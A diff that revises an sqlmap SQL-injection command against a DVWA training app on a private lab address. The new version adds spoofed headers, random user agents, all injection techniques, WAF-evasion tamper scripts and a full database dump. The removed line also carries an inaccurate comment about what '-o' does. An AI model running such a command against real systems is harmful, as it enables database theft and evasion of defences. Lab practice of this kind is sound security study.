@@ -1,5 +1,8 @@
 sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
-  --cookie="security=low; PHPSESSID=7urmi49qup0nj0ddukqithli32" \
-  --batch --dump --level=1 --risk=1 \
-  --dbms=mysql --technique=B \
-  -o nmap-scan-results.txt  # Optional: save output
+  --cookie="security=low; PHPSESSID=7urmi49qup0njqoddkqthli32" \
+  --headers="Referer: http://192.168.56.101/dvwa/vulnerabilities/sqli/" \
+  --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" \
+  --accept="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
+  --batch --dump --level=3 --risk=3 \
+  --dbms=mysql --technique=BEUSTQ --random-agent --tamper=space2comment,between \
+  --flush-session  # Clears old session data if previous runs cached bad results
